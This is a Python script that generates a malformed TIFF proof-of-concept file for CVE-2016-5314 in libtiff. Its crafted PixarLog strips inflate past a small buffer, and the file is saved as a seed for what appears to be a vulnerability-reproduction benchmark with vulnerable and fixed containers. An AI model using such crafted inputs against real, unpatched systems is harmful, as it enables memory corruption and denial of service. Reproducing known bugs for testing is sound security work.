import struct
import zlib
import os

def build_poc():
    header = b"II\x2a\x00\x08\x00\x00\x00"
    
    # We create a zlib payload that inflates to at least a few hundred bytes
    raw_uncompressed_attack = b"A" * 1000
    zlib_payload = zlib.compress(raw_uncompressed_attack)

    # To reproduce CVE-2016-5314 correctly, we want RowsPerStrip=1 and ImageLength=10
    # (small alloc) while letting decompression use the full image trust length.
    # 10 strips are required (imageLength/rowsPerStrip), so we build a strip table
    # with 10 offsets and byte counts, each pointing to a valid compressed strip.
    num_strips = 10

    # Build IFD entries; strip arrays will be stored after IFD.
    entries = [
        (254, 4, 1, 0),             # NewSubfileType: 0
        (256, 3, 1, 10),            # ImageWidth: 10
        (257, 3, 1, 10),            # ImageLength: 10
        (258, 3, 1, 8),             # BitsPerSample: 8
        (259, 3, 1, 32909),         # Compression: PIXARLOG
        (262, 3, 1, 2),             # PhotometricInterpretation: RGB
        (273, 4, num_strips, 0),    # StripOffsets (offset placeholder)
        (277, 3, 1, 3),             # SamplesPerPixel: 3
        (278, 4, 1, 1),             # RowsPerStrip: 1
        (279, 4, num_strips, 0)     # StripByteCounts (offset placeholder)
    ]
    
    # IFD offset placeholders are fixed below once we know exact layout
    strip_offsets_offset = 134
    strip_bytecounts_offset = strip_offsets_offset + num_strips * 4
    payload_offset = strip_bytecounts_offset + num_strips * 4

    entries = [
        (254, 4, 1, 0),             # NewSubfileType: 0
        (256, 3, 1, 10),            # ImageWidth: 10
        (257, 3, 1, 10),            # ImageLength: 10
        (258, 3, 1, 8),             # BitsPerSample: 8 (all samples)
        (259, 3, 1, 32909),         # Compression: PIXARLOG
        (262, 3, 1, 2),             # PhotometricInterpretation: RGB
        (273, 4, num_strips, strip_offsets_offset),
        (277, 3, 1, 3),             # SamplesPerPixel: 3
        (278, 4, 1, 1),             # RowsPerStrip: 1
        (279, 4, num_strips, strip_bytecounts_offset)
    ]

    ifd = struct.pack("<H", len(entries))
    for tag, dtype, count, val in entries:
        ifd += struct.pack("<HHII", tag, dtype, count, val)
    ifd += struct.pack("<I", 0)

    strip_offsets_data = b"".join(struct.pack("<I", payload_offset + i * len(zlib_payload)) for i in range(num_strips))
    strip_bytecounts_data = b"".join(struct.pack("<I", len(zlib_payload)) for _ in range(num_strips))
    payload_data = zlib_payload * num_strips

    return header + ifd + strip_offsets_data + strip_bytecounts_data + payload_data

output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tasks", "CVE-2016-5314_libtiff", "seeds", "poc.tiff"))

with open(output_path, "wb") as f:
    f.write(build_poc())
    
print("PoC regenerated for CVE-2016-5314 (RowsPerStrip=1, ImageLength=10) - test with vuln/fixed containers")
